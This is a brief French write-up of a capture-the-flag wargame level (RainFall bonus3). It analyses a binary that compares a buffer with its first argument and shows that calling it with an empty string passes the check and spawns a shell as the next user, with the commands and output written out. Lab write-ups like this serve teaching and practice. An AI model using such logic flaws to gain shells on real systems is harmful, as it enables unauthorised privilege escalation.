# Bonus 2

En ouvrant l'executable dans cuter on peut voir plusieure chose 
- un open de `/home/user/end/.pass"`
- une condition qui execute un `/bin/sh`
- un atoi et strcmp qu'on pourrais overflow
on peut voir que la condition demande que le buffer soit egale au premier argument
```
if (strcmp(buffer, av[1]) == 0)
```
On peut voir avant la condition que le programme met un `\0` a l'`atoi` de `av[1]` dans le buffer donc en mettant une chaine vide en parametre le `strcmp`comparera deux chaine vide. En metant "0" `atoi` sortira bien 0 mais les deux chaine ne seront plus egale. 
```
bonus3@RainFall:~$ ./bonus3 "0"
(
	av[1] = "0"
	buff = ""
)
```
Donc il suffi de lancer le programme avec un argument vide
```
bonus3@RainFall:~$ ./bonus3 ""
$ whoami
end
$  
```